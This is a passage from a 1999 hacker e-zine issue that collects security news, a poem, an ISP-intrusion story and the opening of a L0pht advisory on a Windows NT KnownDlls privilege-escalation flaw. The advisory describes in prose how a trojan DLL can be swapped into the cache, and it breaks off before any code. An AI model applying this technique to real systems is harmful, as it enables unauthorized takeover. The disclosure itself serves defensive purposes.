+         it doesn't matter to us but it sure sucks for the poor mr and mrs average
+         scanner owner - Ed)
+
+         Rep. Wilson's website: http://www.house.gov/wilson/welcome.html
+         ask.heather@mail.house.gov 
+         
+     ++  Federal budget buys some space
+	 Contributed by sAs- source: EXN science wire
+	
+	  ttp://exn.ca/html/templates/mastertop.cfm?ID=19990217-53
+	
+	Packed with funding goodies -- the 1999 federal budget has left the
+	employees of the Canadian Space Agency starry-eyed.  "The mood is 
+	great here," confirmed jubilant CSA spokesman Hugues Gilbert in a 
+	telephone interview Wednesday.   And why wouldn't it be?  The budget
+	announced by Finance Minister Paul Martin's this week gives the space
+	agency an extra $430 million over the next three years, plus  $300 mil
+	annually after that.     
+	    
+     ++ Hands-off and intelligent
+	Contributed by sAs- source: EXN science wire
+	http://exn.ca/html/templates/mastertop.cfm?ID=19990217-55
+	
+	The day when your average car driver can relax, put his hands behind
+	his head and watch all the pretty trees go by is not quite upon us yet.
+	But researchers in Germany won't rest until it is. They're busy developing
+	an autonomous intelligent copilot system that should ultimately be able to
+	get you from point A to B with almost no input on your part. You still might
+	have to take charge of the sound system, though. - this should be fun when 
+	it comes out, <beep> WARNING! your vehicle has just been hijacked! - Ed
+	
+     
+     Mucho thanks to Spikeman for directing his efforts to our cause of bringing
+     you the news we want to read about in a timely manner ... - Ed
+     
+     @HWA
+     
+     
+  02.0  From the editor.
+        ~~~~~~~~~~~~~~~~
+
+     #include <stdio.h>
+     #include <insight.h>
+     #include <backup.h>
+
+     main()
+     {
+      printf ("Read commented source!\n\n");
+      
+     /*             
+      *Ok kiddies we're pumping out some more stuff here as we steamroll into  
+      *issue #6 i'm wondering if we can really pull off a weekly release as
+      *hoped. I mean hopefully not too many people are getting caught and not
+      *too many sites (bah hahahaha yeah right) are being vandalized by the script
+      *kiddiez etc. Work continues on hwa-iwa.org which is running Debian Linux at
+      *this time, i'm playing around with some stuff there but don't bother port
+      *scanning etc u won't find anything interesting on that box unless you really
+      *want to snarf half written articles <grin> etc ... besides if you did break
+      *in i'd just end up writing a story about it so whats the point? *g* moving
+      *right along, thanks for the continued support everyone and tty next time...
+      */
+      printf ("EoF.\n");
+      }
+
+
+      www.hwa-iwa.org is now online but not ready for primetime yet, if you go
+      there you will just be presented with a link to the HWA.hax0r.news mirrors
+      the site is under major development and will be announced here when it goes
+      "online for primetime" with webboard and file archives etc etc, stay tuned
+      for more as it becomes available ie: as I get it done ... ;)
+      
+      Issue #6! ... w00t w00t w00t! ... 
+      
+      w00t! /`wu:t n & v w00ten /`wu:ten n & v Eng. Unk.
+        1. A transcursion or transcendance into joy from an otherwise inert state
+        2. Something Cruciphux can't go a day without typing on Efnet
+     
+      Congrats, thanks, articles, news submissions and kudos to us at the
+     main address: hwa@press.usmc.net complaints and all nastygrams and 
+     mailbombs can go to /dev/nul nukes, synfloods and papasmurfs to 
+     127.0.0.1, private mail to cruciphux@dok.org
+
+     danke.
+
+     C*:.
+
+
+     @HWA
+
+
+ 03.0  Army Signal Command protecting networks from hackers
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       
+      To: InfoSec News <isn@repsec.com>
+      Subject: [ISN] Army Signal Command protecting networks from hackers
+      
+      
+      http://www.dtic.mil/armylink/news/Feb1999/a19990211hacksec.html
+      Army Signal Command protecting networks from hackers
+      by Sgt. 1st Class Jim Ward
+      
+      FORT HUACHUCA, Ariz., (Army News Service, Feb. 11, 1999) -- Soldiers on
+      patrol in countries spanning the globe are the sentries who keep enemies
+      at bay. Even as they stand guard at the dawn of the new century, a system
+      called information assurance is doing likewise -- with them in mind. 
+      
+      Information assurance is the umbrella term for what is a new way to ensure
+      that the military's computer networks withstand withering attacks from
+      foreign and domestic hackers. 
+      
+      Leading the charge in this effort is a team of computer networkers and
+      specialists with the U.S.  Army Signal Command. This team has been working
+      since March 1998 to accomplish a mission handed down from the highest
+      levels of the defense leadership. 
+      
+      According to Lt. Col. James M. Withers, the head of the team, the team's
+      charter is simple: devise a strategy that will keep critical networks as
+      safe from intrusion as possible, and an action plan to help get there. 
+      
+      "Our mission, as outlined by the Army vice chief of staff is to implement
+      near real time, worldwide, common picture of the Army's Military
+      Information Environment," Withers said. 
+      
+      This was done by combining the Army's Information Service Provider
+      functions with the Army Regional Computer Emergency Response Team. This,
+      according to Withers, ensures that reporting of this common picture of
+      this Military Information Environment to a central coordination center,
+      located at Fort Huachuca. 
+      
+      "This action provided the Army Signal Command with an enhanced acquisition
+      of unified and global near-real-time protect, detect and react
+      capabilities through the lash-up of these two functions,"  Withers said. 
+      
+      Withers said that this process involves computer systems specialists from
+      around the world. These personnel, in tandem with the Army Regional
+      Computer Emergency Response Team, combine forces to detect hackers and
+      others as soon as possible before damage can be done. 
+      
+      Computer systems specialists with the 1st Signal Brigade in Korea, the
+      516th Signal Battalion in Hawaii and the 5th Signal Command in Germany
+      operate and maintain Network and Systems Operations Centers. These
+      soldiers and civilians are responsible for the detection effort in their
+      theaters and report activity to the Army Signal Command headquarters. 
+      
+      Once at the ASC level, Army Network and Systems Operations Center staff
+      performs over-watch on most of the Army's networks. This is an effort to
+      keep the networks humming along, providing the information lifeline
+      soldiers rely on as they perform their peace enforcement role around the
+      world. 
+      
+      All of this, Withers said, is being done to ensure the Army's critical
+      circuits and information systems don't fall prey to "cyberterrorists," who
+      wish to do damage to the Army's ability to protect America. "The Army is
+      in the lead in this battle thanks to the can-do attitude of the team that
+      assembled here at ASC headquarters several months ago," Withers said. 
+      
+      
+Now that the team has slammed the door on these terrorists and locked up
+      the networks, the need for constant vigilance goes on. That's where the
+      Regional Computer Emergency Response Team and its theater-level
+      counterparts come in. 
+      
+      "Without the human element, this mission won't get done. The soldier is at
+      the tip of the spear,"  Withers said. "Our team is a part of the process
+      -- from fort to foxhole." 
+      
+      (Editor's note: Ward is with the U.S. Army Signal Command's Public Affairs
+      Office at Fort Huachuca, Ariz.) 
+      
+      -o-
+      Subscribe: mail majordomo@repsec.com with "subscribe isn".
+      Today's ISN Sponsor: Internet Security Institute [www.isi-sec.com]
+
+      @HWA
+      
+ 03.1 The Key To Unlocking Data Access
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+      To: InfoSec News <isn@repsec.com>
+      Subject: [ISN] The Key to Unlocking Data Access
+          
+      
+      Tuesday, February 16, 1999, 2:00 p.m. ET. 
+      The Key To Unlocking Data Access
+      By RUTRELL YASIN 
+      
+      Enterprises are finally doing something about their insecure intranets and
+      extranets. Public-key infrastructure (PKI) technology--until now used
+      mostly to secure Internet transactions in banking and other financial
+      applications--is now reaching deep into corporate departments and everyday
+      business applications. 
+      
+      Enterprises can no longer operate without a PKI safety net as they extend
+      applications and data to partners and far-flung employees. 
+      
+      Companies are looking for their "return on investment with PKI to come
+      from [securing] business-to-business and internal applications such as
+      human resources systems," says John Pescatore, a senior consultant with
+      PKI vendor Entrust Technologies Inc. 
+      
+      Leading the way are corporate titans such as Federal Express Corp.,
+      NationsBank Corp. and Texas Instruments Inc., all of which are piloting
+      projects that could set the stage for internal PKI deployment for
+      authentication, privacy and data integrity. 
+      
+      Federal Express is out in front. Fedex hopes to reap the benefits of PKI
+      this spring as it rolls out a digital signature-enabled human resources
+      system that gives the company's 141,000 employees secure access to their
+      personnel files. 
+      
+      Fedex, which is using Entrust encryption-key management, secure e-mail and
+      application development tools, worked closely with Entrust to migrate the
+      mainframe-based HR systems to an intranet. 
+      
+      "When we first started with PKI, we found all the PKI vendors were
+      following an Internet model, not an intranet model," says James Candler,
+      Fedex's vice president of personnel systems and support.  Changes were
+      required to plug PKI into an intranet environment in which users might use
+      multiple workstations, he says. 
+      
+      With Internet transactions, the model is much simpler: a home user
+      conducting a transaction with a bank can download a digital
+      certificate--electronic signatures that verify a user's identity--to a PC,
+      and the information is specific to that computer. 
+      
+      However, in a corporate setting such as Fedex, departmental and field
+      users need access to desktop PCs in conference rooms and at kiosks.
+      Single-system digital certificates are not enough. 
+      
+      As a result, Fedex "had to create roaming certificates" that could be
+      downloaded to a PC from an LDAP-based corporate directory, Candler says. 
+      
+      Using an Entrust digital certificate password and hardware ID tokens that
+      resemble credit cards, Fedex wants its managers to transmit employee
+      performance appraisals over the intranet, for example, eliminating a lot
+      of paperwork. 
+      
+      But at $65 apiece, the company didn't want to give every employee a secure
+      ID token. "We created a level of trust in the HR system," so employees who
+      don't need access to a higher level of information can log on with just a
+      passphrase, Candler says. 
+      
+      One benefit is that the implementation of PKI encryption and digital
+      certificates is letting Fedex employees perform tasks on the Web that they
+      couldn't before, Candler notes. For example, employee salary reviews are
+      now sent to a supervisor via an e-mail message that includes a URL address
+      
+linking directly to the appropriate HR site where the review is written.
+      Then the supervisor can forward the information on to HR. 
+      
+      Candler thinks other companies will add Web extensions to their HR systems
+      to give employees self-service access to benefit and retirement plans. 
+      
+      "I've talked to other CIOs, and they agree that this is exactly where
+      their companies need to go,"  Candler says. "We're leading the market by
+      about a year," he says. 
+      
+      But as organizations deploy PKI, product interoperability and certificate
+      management have become problematic. 
+      
+      NationsBank, a unit of $6.5 billion Bank of America, has launched pilot
+      projects to give employees access to personnel records, 401(k) and other
+      benefits, says Sam Phillips, senior vice president of information security
+      at the bank. 
+      
+      PKI is generating "a lot of excitement," Phillips says. However, "like
+      most companies, we want to standardize on one e-mail package. We are a
+      very large organization constantly in acquisition" mode, he says. If one
+      division is using Lotus Notes and the other Microsoft Exchange, the
+      question is how to make the packages work together so that an S/MIME
+      security implementation works across both systems, he says. 
+      
+      Another obstacle is directory services, specifically ensuring
+      interoperability between LDAP interfaces from Microsoft, Netscape and
+      Novell, he says. 
+      
+      To overcome some of these interoperability problems, NationsBank is using
+      VeriSign Inc.'s Onsite integrated platform as a primary Certificate
+      Authority. VeriSign "gives us flexibility," Phillips says. Instead of
+      NationsBank setting up the PKI infrastructure internally, "VeriSign offers
+      a complete set of services. We can leverage what they're doing" to
+      communicate with GTE CyberTrust or Netscape if customers choose
+      certificates from those vendors, he says. 
+      
+      Even electronics giant Texas Instruments opted for VeriSign, scrapping
+      plans to launch a homegrown PKI framework. 
+      
+      "We actually built our own PKI, which was fairly robust, but we wanted to
+      concentrate on our core competency," says John Fraser, IT security manager
+      at the $8.4 billion manufacturer. "To deploy PKI, you had to pull together
+      the servers, desktops, clients, the whole ball of wax," Fraser says. 
+      
+      "We wanted to be in the position as the market changes to move to the next
+      new solution in PKI without changing" the whole infrastructure, Fraser
+      says. Because VeriSign is based on an open platform, off-the-shelf
+      security products can be integrated into the framework, reducing costs. 
+      
+      TI will deploy PKI both for intranets and Internet apps, Fraser says. "But
+      our plan is not to use VeriSign digital certificates for
+      customer-to-business transactions--not like the banking model." 
+      
+      TI has launched a program to forge tighter links with suppliers and to
+      extend its intranet to accommodate more self-service apps, he says. 
+      
+      As the company deployed PKI technology and digital certificates, the
+      biggest hurdles were managing a certificate revocation list and key escrow
+      for employees who forgot passwords, Fraser says. 
+      
+      VeriSign is attempting to solve that problem with OnSite Key Manager,
+      which provides encrypted backup and recovery of end-user keys and digital
+      
+certificates used within a PKI. 
+      
+      For the past year, Entrust, VeriSign and other PKI vendors have been
+      offering tools that make it easier to manage multiple certificates from
+      different vendors as well as add, change and revoke certificates. 
+      
+      Securing access to enterprise resource planning apps such as SAP is the
+      next step for TI's PKI efforts, Fraser says. TI plans to deploy digital
+      certificates for SAP's Internet Transaction Server, he says. 
+      
+      ERP applications weren't offering links to PKI a year ago, Fraser says.
+      Now SAP, PeopleSoft and Oracle realize their proprietary solutions have to
+      be extended to acknowledge technologies such as Kerberos authentication
+      and PKI. 
+      
+      Users are asking about PKI extensions to apps from PeopleSoft and SAP, as
+      well as enterprise management platforms such as Computer Associates'
+      Unicenter TNG and Tivoli Systems Inc.'s TME, Pescatore says. 
+      
+      Management platforms are the likely places to add hooks for security
+      modules. "The same platform that is used for managing resources also can
+      be used to manage people using digital certificates. This way, VPNs,
+      switches and routers all can be tied in with PKI," he says. 
+      
+      The government of Ontario, Canada, has several pilot projects with Entrust
+      that should bear fruit this year, says Scott Campbell, assistant deputy
+      minister there. The government is issuing digital certificates to social
+      workers at the 50 Children's Aide Societies across the province to ensure
+      privacy. The certificates will let case workers securely access a central
+      database to keep track of child abuse cases. 
+      
+      The database is updated regularly, so workers can keep better tabs on
+      abused children if they move from Toronto, for example, to Ottawa,
+      Campbell says. Prior to the pilot, it could take months for workers to
+      track down the whereabouts of a child. 
+      
+      Ontario also uses PKI to secure e-mail for the 6,000-person Ontario
+      Provincial Police force. A third pilot will help the 300-person IT group
+      determine if there are any holes in the technology, he says. 
+      
+      As users deploy PKI pilots, they may find the real challenge is defining
+      policies that link the technology with business processes, says Spiros
+      Angelopoulos, a group manager with Raytheon at the NASA Ames Research
+      Center. 
+      
+      "The tools are there, but [companies must define] policies on how to
+      implement the tools," he says.  For example, with digital certificates,
+      companies need to establish a policy for user eligibility and how users
+      will receive their credentials, he says. 
+      
+      NASA Ames, which has 11 research centers across the nation, is using PKI
+      for secure e-mail. The center is moving toward the day when "every person
+      [at the center] will have a digital certificate,"  Angelopoulos says. 
+      
+      As PKI products continue to mature and pilots move into production this
+      year, IT managers anticipate a surge in PKI deployments. Says TI's Fraser:
+      "There's more than a [growing] interest in PKI; there's a lot of pent-up
+      demand." 
+      
+      
+      -o-
+      Subscribe: mail majordomo@repsec.com with "subscribe isn".
+      Today's ISN Sponsor: Internet Security Institute [www.isi-sec.com]
+      
+      @HWA
+      
+ 03.2  Online streaking, are you doing it right now??
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
+       
+       X-Authentication-Warning: enigma.repsec.com: majordomo set sender to owner-isn@repsec.com using -f
+Received: from mail.inficad.com (mail.inficad.com [207.19.74.5])
+	by enigma.repsec.com (9.0.1a/7.7.4.nospam) with ESMTP id OAA27245
+	for <isn@repsec.com>; Wed, 17 Feb 1999 14:36:58 -0700
+Received: from shadow.dimensional.com (root@shadow.pagan.net [206.124.26.20])
+	by mail.inficad.com (8.9.2/8.9.0) with ESMTP id OAA08384
+	for <isn@repsec.com>; Wed, 17 Feb 1999 14:54:04 -0700 (MST)
+Received: from flatland.dimensional.com (jericho@flatland.dimensional.com [208.206.176.24])
+	by shadow.dimensional.com (8.9.1/8.9.1) with SMTP id OAA26722
+      for <isn@repsec.com>; Wed, 17 Feb 1999 14:52:48 -0700 (MST)
+      To: InfoSec News <isn@repsec.com>
+      Subject: [ISN] Are You Naked Online? How to Protect Your E-Privacy 
+      X-Copyright: This e-mail copyright 1998 by jericho@dimensional.com where applicable
+      
+      
+      Forwarded From: darek milewski <darekm@cmeasures.com>
+      
+      Are You Naked Online? How to Protect Your E-Privacy
+      http://chkpt.zdnet.com/chkpt/adem2fpf/www.anchordesk.com/story/story_3102.html
+      Jesse Berst, Editorial Director
+      Wednesday, February 17, 1999
+      
+      Remember streakers? Those nutty nudes of the seventies who darted across
+      college campuses? 
+      
+      I was always too uptight to join their au naturel jaunts.  Now, more than
+      20 years later, every Netizen risks total exposure. Of email messages. Of
+      medical records. Of places surfed. 
+      
+      I still don't want to bare all. While most Internet businesses work hard
+      to protect your privacy, human screw-ups still happen. That's why these
+      recent headlines worry me: 
+      
+      Patient Records on Web: Patient records -- containing names, phone and
+      Social Security numbers, and medical treatments -- at the University of
+      Michigan Medical Center inadvertently lingered on public Web sites for two
+      months.  Click for more. 
+      
+      Valentine's Day Cards Not Private: A programming glitch at the Hallmark
+      Cards Web site enabled curious folks to read other people's love notes --
+      and names, home and email addresses and places of employment. (Does Ken
+      Starr know about this site?) Click for more. 
+      
+      FreePCs Raise Privacy Concerns: More than 500,000 people submitted
+      personal information in a bid to win one of only 10,000 free PCs, which
+      will record user behavior.  In other words, 490,000 people gave away their
+      privacy to enter a contest.  In this case the stupidity was on the part of
+      the user. Click for more. 
+      
+      Prodded by paranoia, I investigated ways to protect me and my data from
+      prying eyes. Good news: There are ways to prevent online exposure. 
+      
+      Abstinence: The safest way to avoid unplanned privacy invasions is to
+      control yourself. 
+      
+      Don't send super-personal information via email. (That's what FedEx is
+      for.)  Don't offer unnecessary info. Bigbookstore.com doesn't need your
+      height and weight.  Restrict access to your files. Insist on it with your
+      doctor, banker and broker. 
+      
+      Privacy Policies: Scroll down to the bottom of any reputable Web site,
+      including this one, and you'll notice a link to the privacy statement. It
+      will tell you: 
+      
+      What info the site gathers about you What it does with the data With whom
+      it shares the data
+      
+      If that policy's cool with you, browse freely. If not, surf elsewhere. 
+      
+      An independent consortium called TRUSTe verifies privacy statements and
+      "stamps" its seal of approval on sites that abide by its standards. TRUSTe
+      also oversees a site of its own where you can report privacy offenders.
+      Click for more. 
+      
+      Encryption: Think of email notes as postcards -- anyone can read 'em. Many
+      people rely on "security by obscurity"  to protect their email secrets. As
+      in, "there's so much email zipping around no one's going to notice mine."
+      Encryption is a better method. 
+      
+      Encryption Primer: Click for more.  Encryption Survival Guide: Encryption
+      expert Robert Gelman discusses how to encrypt your email. Click for more. 
+      Online Transactions: ZDTV reveals how encryption protects online shoppers.
+      Click for more. 
+      
+      
+      Be Vigilant: Despite my berst, er ... burst, of paranoia, there's no need
+      to worry constantly about electronic privacy.  Let the professionals fret
+      
+for you. An occasional glance at one of their sites will keep you
+      up-to-date. 
+      
+      
+      Electronic Frontier Foundation: Non-profit organization that lobbies for,
+      among other things, online privacy.  Click for more.  Electronic Privacy
+      Information Center: Excellent EPIC features news, tool and resources.
+      Click for more.  FreeCrypto: Encryption site with political bent. Click
+      for more. 
+      
+      Unlike streaking, online privacy is not a passing fad.       
+       
+       
+       @HWA
+         
+       
+ 04.0  France plays leapfrog with US over crypto laws..
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     
+       WTF is up with the French gov't?? who do they think they are? first its
+      nukes now they're messing with crypto ... ok I sympathize with this one a
+      bit but anyone who practices nukes in another country or at all for that 
+      matter should be shat on then nuked. EoD - Ed
+      
+      Date: Wed, 17 Feb 1999 22:42:26 -0800
+      From: "Dr. Vann Harl" <vann@schnags.com>
+      Subject: France tell NSA to shove it
+      
+      
+      FRANCE BREAKS RANKS WITH USA & AGAINST USA ON CODES
+      
+      By far the most significant intelligence and security news of
+      the fortnight is French Prime Minister Lionel Jospin's 19
+      January announcement that France is suddenly reversing its
+      long-term and traditionally restrictive policy toward the
+      public use of encryption systems and allowing complete freedom
+      of use of systems with key lengths up to and including 128
+      bits.  Currently, only 40 bit keys are legal and they must be
+      deposited with a trusted third party ... of which there is only
+      one recognized in all of France.  Under today's French law, the
+      government has a right to understand any type of communication
+      using public facilities, meaning post, telecommunications,
+      semaphores, or what have you, although this law is seldom
+      invoked publicly.
+      
+      The implication of this French decision goes far beyond France
+      itself and is the first splash of a tidal change that will, in
+      all likelihood, drown the international public encryption
+      policy the US is trying to impose on the world in the name of
+      fighting crime, drugs and terrorism.  France, which has
+      probably suffered more deaths in the past few years from
+      foreign terrorists than any other developed nation, "heard the
+      players, questioned the experts and consulted its international
+      partners" and explicitly decided that American high-tech
+      eavesdropping and economic espionage is more detrimental to
+      French interests than terrorists using encrypted
+      communications.  The American menace is easily discernable in
+      the opening lines of Mr. Jospin's statement concerning this
+      tidal change in encryption policy:  "With the development of
+      electronic espionage instruments, cryptography appears as an
+      essential instrument of privacy protection."  No mention of
+      crime, drugs or terrorists.
+      
+      Since the EU has already imposed much stronger privacy
+      protection laws than the US, has debated the threat posed by
+      the NSA Echelon worldwide telecommunications surveillance
+      system, and has resisted "falling in line behind the FBI" on
+      public eavesdropping, experts expect all EU countries to
+      announce similar public encryption liberalization in the near
+      future.  Indeed, this seems to be the developing EU strategy of
+      letting the "uppity, snobbish Gallic French stand up to the
+      Americans", something the French have always done with pride.
+      Then, "once the rampart is breached", suddenly the other EU
+      countries follow suit in a movement that could only have been
+      negotiated and organized beforehand.  Specialists know it's
+      coming on drug policies, but very few anticipated that a French
+      Socialist government would stand up so unexpectedly to French
+      security and intelligence services (which imposed the 40 bit
+      key limit, a record lower limit in Western countries) and to
+      the US.  Now it's done, the floodgates are open and watch
+      what's going to happen ...  (...cut...)
+      
+      ---------------------------------------------
+
+     
+     @HWA
+
+ 05.0  More kewl poetry from Phiregod
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+      Before u read this excellent piece of prose, clear your mind of any shit
+      that might be left over from your workaday meagre existance and ponder 
+      the wisdom in the words, don't go off half-cocked coz it mentions gh0d 
+      either the message is deep some of you will not get it, I think that I do,
+      since my IQ is in the 150+ range but some of you dumbasses out there may
+      have trouble with it <sarcasm> anyways read on and enjoy but keep your 
+      flames to yourself, thanks phiregod for another really cool piece, 
+      keep writing! - Ed 
+       
+      
+      `_god42_'
+      
+      how many times do i have to walk down these halls humming 'in the name 
+      of love' and searching my soul for the ability to accept myself and 
+      
+others for who and what we are before i know what it is that i'm 
+      supposed to be doing with my life?
+      
+      how many times do i have to recite the lord's prayer before i feel the 
+      peace i see etched in so many a worshipers' face, when will i know there 
+      is a god and that will bring me what i see fulfilled in the heart of 
+      everyone i pass on the streets?
+      
+      how many times do i have to cry for the world before a single tear is 
+      shed on my behalf, why do i have to be the savior of my own soul when i 
+      see so many that are in the hands of their own personal messiah?
+      
+      why do i have to be the one that bleeds?
+      why am i the one that suffers the sins of the children?
+      why do i not see a divine power?
+      
+      slowly but surely i see my ability to speak being taken away, first a 
+      number on a pentium processor, then a barcode tattooed on my neck. 
+      history is in words, life is in words, love is in words.
+      
+      i hunted my quarry and i held its beating heart in my hands before i 
+      drank it's warm blood, i will not let this be taken from me. without 
+      freedom my soul is but another caged bird that sings it's sorrow from 
+      plastic perch. i will not exsist without my voice, the shred of sanity 
+      that comforts me in the complacent warmth of my so called education.
+      
+      i'm in a battle field with no weapon to vanquish the mighty empires 
+      except the reason i present without showing my face. like a single 
+      scream of a victim in the night i want my words to evoke primal fear in 
+      the expression of those that hear it. 
+      
+      this is the time that we must use our words not our fists, this is when 
+      we win with our knowledge and skill rather then with hatred and money. 
+      this is the point in time that we drop our swords and reveal our wrists 
+      to be cut for it is the only way that we can show that we are not 
+      afraid. this is where the world realizes its sins against its children.
+      
+      i'm failing english even tho i finally understand it's use. i'm slipping 
+      out of irc when i finally found what it is i want to say. i'm 
+      disappearing from my friend's eyes even tho i understand what it is that 
+      they want to see. i'm feeling the grim reaper's breath on my neck even 
+      tho its not me that he wants.
+      
+      this rant is over, my voice is weak, and my spirit is worn. i dont want 
+      another promise or another wish, i want to wake up and know that i dont 
+      have to defend my views, that people understand evil in all of it's 
+      forms. i want to yell at the top of my lungs and know that everyone who 
+      can hear me will. i dont want to see any more imprisioned for the very 
+      things we should praise.
+      
+      dont sell out.
+      
+      amen,
+      phiregod
+      liquidphire@hotmail.com
+      please excuse any grammatical or spelling errors
+      (c) 1999 Phiregod/Liquid Phire and HWA.hax0r.news
+      
+      
+      @HWA
+
+
+ 06.0 ISP cracks User's machine then threatens legal action on THEM
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     
+     Source: http://apcmag.com:8008/apcweb/forum.nsf/Headlines/133A922A7876969A4A2566FE00042BC0?OpenDocument
+     Contributed by sAs via HNN contributed by _GryPhoNN_ 
+     
+     17/02/99
+     Service & Reliability February 99: Hard drive hacked -- by ISP
+
+     Roulla Yiacoumi (c) 1999
+
+     When APC's Service & Reliability column received a phone call from an Internet
+     user claiming his hard drive had been hacked into by his ISP, we had reservations.
+     After all, this was something we had heard many times before, but had never seen
+     proven.
+
+     What made this time different, however, was that the user claimed he had received a letter from his provider explaining how it had
+     committed the deed. Of course we were interested, but we still had no proof. So we asked the reader to forward the letter to us. 
+
+     To our utter surprise, there were the words, in black and white. In an email addressed to the user, the provider wrote: "For your
+     information, our network administrator, with very little effort, was able to violate your computer's security and examine the contents of
+     your hard drive in only a few minutes." 
+
+     We read it and re-read it. Surely no ISP would actually admit it had hacked a user's hard drive? 
+
+     The name of this ISP? Internet Information Superhighway (IIS). Regular readers will recall that IIS was also the subject of a Service &
+     Reliability column in March 1998 (see here), when a reader claimed he had been disconnected from the service after complaining
+     about a fee increase. 
+
+     So, what horrible offence had this user committed that IIS felt it was within its power to violate the user's hard drive? He had installed
+     an option from the Windows 98 CD called 'HTTP Server' (part of 'Personal Web Server'), believing it was some kind of Web site
+     creation tool. When he discovered it wasn't what he thought it was, he left it sitting on his hard drive until he received the
+     heavy-handed letter from IIS which claimed it had "detected" the program on his machine, demanding it be immediately removed.
+     Further, the provider had the gall to tell the reader that "operating such a service without the appropriate sanctions by the authorities
+     offends State and Federal legislation, not to mention breaching our usage policy under our terms and conditions." 
+
+     Now, we do not dispute that installing this program may have breached the ISP's terms and conditions. Indeed, it is in every user's
+     best interests to read the online agreement before signing up with any provider and to make sure they understand what they can and
+     can't do. However, to claim having this program offends state and federal legislation is ludicrous. There are no laws requiring users
+     to seek approval before running a Web service. Indeed, when we asked IIS to clarify what it meant by these statements, we received
+     a nasty legal letter -- but no answers. 
+
+     The user told us he had contacted the Telecommunications Industry Ombudsman (TIO) and the NSW Commercial Crime Agency.
+     We contacted both of these bodies to see what they had to say about this incident. 
+
+     The TIO said that it had received this complaint and confirmed the matter had been referred to the NSW Police's Commercial Crime
+     Agency. 
+
+     We contacted the NSW Police and spoke to the Computer Crime Investigations Unit. A spokesperson confirmed the matter had
+     been referred to them and had been investigated. Although no further action was taken against this ISP, the police have informed
+     Service & Reliability that they would consider taking action against any ISP that acted with malicious intent, or without authority or
+     lawful excuse in accessing data stored on a computer. 
+
+     And, of course, we attempted to contact the ISP. As we had previously dealt with this ISP, we sent email to the three addresses we
+     had on our books, but all three came back a day later saying they could not be delivered. 
+
+     APC's daily news service Newswire (http://newswire.com.au/) published the story 'ISP busted for hacking' in November 1998 (see
+     here). At the time of posting the story on its site, Newswire wrote that it was unable to contact IIS for comment. 
+
+     When we later decided to run this story as part of Service & Reliability in the magazine, we again attempted to contact the ISP -- this
+     time by fax. We sent a letter and a copy of the Newswire article, inviting the ISP to give its side of the story. We informed the
+     provider that if it wished to respond via Australian Consolidated Press' lawyers, it was welcome to do so. (Australian Personal
+     Computer is published by Australian Consolidated Press.) We requested a written response be forthcoming within one week. 
+
+     Shortly before this deadline expired, our legal team received a written response from the provider's lawyer. It stated that "Newswire
+     was not unable to contact my client as alleged" (false), that the NSW Commercial Crime Agency had not conducted an
+     "investigation" into its client (we only stated that the police had investigated the matter), and that the user was "publishing
+     pornographic material over the Internet using my client's service" -- a claim both the user and police instantly dismissed. 
+
+     Further, the police added that the viewing and downloading of adult material over the Internet was not illegal (with the exception of
+     child pornography, which was not an issue in this case). If the ISP suspected illegal activity on the part of a user, it is obligated to
+     contact the police and not take matters into its own hands. 
+
+     The ISP's lawyer demanded a retraction, claiming Newswire's article was "biased, distorted and malicious". It further accused the
+     author of the article (yours truly) of being "involved in a conspiracy to falsely accuse my client of a crime", adding that this in itself is a
+     crime "punishable by penal servitude for fourteen years". 
+
+     Service & Reliability is a consumer column which seeks to address issues our readers have with hardware and software vendors,
+     ISPs and related businesses. To present both sides of an issue, the vendor is invited and encouraged to respond to the reader's
+     letter -- both the complaint and response are then published. If a vendor does not wish to submit a response, we will publish the
+     complaint without it. 
+
+     We do not succumb to the threat of legal proceedings -- regardless of who the vendor is. Our readers trust APC for its unbiased
+     reporting and thoroughly investigated issues. 
+
+     If you have any comments, drop me a line at ry@acp.com.au. 
+
+     @HWA
+
+ 07.0 The l0pht releases new NT advisory
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+      
+                          L0pht Security Advisory
+
+   
+           Release date: February 18, 1999
+            Application: Microsoft Windows NT 4.0
+               Severity: any local user can gain administator privileges
+                         and/or take full control over the system
+                  
+                 Author: dildog@l0pht.com
+                    URL: http://www.L0pht.com/advisories.html
+
+      ---
+      Overview :
+      ---
+      
+              Microsoft Windows NT 4.0 implements a system-wide cache of
+      file-mapping objects for the purpose of loading system dynamic link
+      libraries (DLLs) as quickly as possible. These cache objects, located in
+      the system's internal object namespace, are created with permissions such
+      that the 'Everyone' group has full control over them. Hence, it is
+      possible to delete these cache objects and replace them with others that
+      point to different DLLs. 
+      
+              When processes are created, the loader maps/loads the loading
+      executable's imported DLLs into the process space. If there is a DLL cache
+      object available, it is simply mapped into the process space, rather than
+      going to the disk. Hence, there is an exploitable condition, when a
+      low-privilege user replaces a DLL in the cache with a trojan DLL, followed
+      by a high-privelege account launching a process. The high priveleged
+      process will map in the trojan DLL and execute code on behalf of the low
+      privelege use r. 
+      
+      --- 
+      Affected systems:
+      ---
+      
+              Windows NT 4.0 Server SP4
+              Windows NT 4.0 Workstation SP4
+              Other service packs are likely to be vulnerable, but the exploit has
+              not been tested on them, neither has the fix presented below.
+      
+      ---
+      Description :
+      ---
+      
+              The Windows NT object namespace is the place where the kernel
+      keeps the names of mutexes, semaphores, filemapping objects, and other
+      kernel objects. It is organized hierarchically, like a directory
+      structure. Amongst the directories are: 
+              
+              \Device
+              \BaseNamedObjects
+              \Driver
+              \KnownDlls
+              ...
+              
+              The NT object namespace is browsable with a tool called 'WinObj
+      2.0' from System Internals (their website is http://www.sysinternals.com).
+      You may wish to look around this namespace and browse the default
+      permissions of objects. It is quiet entertaining, really.
+      
+              The "\Knowndlls" directory contains a list of DLLs in the
+      c:\winnt\system32 directory, like: 
+      
+              \KnownDlls\COMCTL32.dll
+              \KnownDlls\MPR.dll
+              \KnownDlls\advapi32.dll
+              \KnownDlls\kernel32.dll
+              ..
+      
+              All of these objects are created at boot time, and are 'permanent
+      shared objects'. Normally, users can not create permanent shared objects
+      (it's an advanced user right, and it is normally not assigned to any
